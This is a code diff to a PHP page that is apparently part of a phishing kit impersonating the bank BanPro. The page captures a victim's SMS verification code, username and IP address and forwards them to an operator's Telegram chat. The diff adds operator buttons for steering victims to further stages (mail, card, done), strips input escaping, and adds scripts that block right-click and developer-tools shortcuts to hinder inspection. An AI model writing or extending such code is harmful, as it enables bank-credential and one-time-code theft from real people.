@@ -5,7 +5,7 @@ include("settings.php"); // Contiene $token y $chat_id
 $usuario = $_SESSION['usuario'] ?? null;
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
-    $codigo = htmlspecialchars($_POST['ips1'] ?? '');
+    $codigo = $_POST['ips1'] ?? '';
     $ip = $_SERVER['REMOTE_ADDR'];
 
     $msg = "CORRECCIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";
@@ -20,8 +20,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
                     ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"]
                 ],
                 [
-                    ['text' => '❗ Login Error', 'callback_data' => "LOGINERROR|$usuario"],
                     ['text' => '💳 CARD', 'callback_data' => "CARD|$usuario"]
+                ],
+                [
+                    ['text' => '📩 Mail', 'callback_data' => "MAIL|$usuario"],
+                    ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
                 ]
             ]
         ])
@@ -92,5 +95,30 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
         }
     }
 </style>
+<script>
+    // Protección contra clic derecho y código fuente
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    document.addEventListener('keydown', function(e) {
+        // Prevenir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        if (e.keyCode === 123 || // F12
+            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+            (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Prevenir arrastrar imágenes
+    document.addEventListener('dragstart', function(e) {
+        if (e.target.tagName === 'IMG') {
+            e.preventDefault();
+            return false;
+        }
+    });
+</script>
 </body>
 </html>
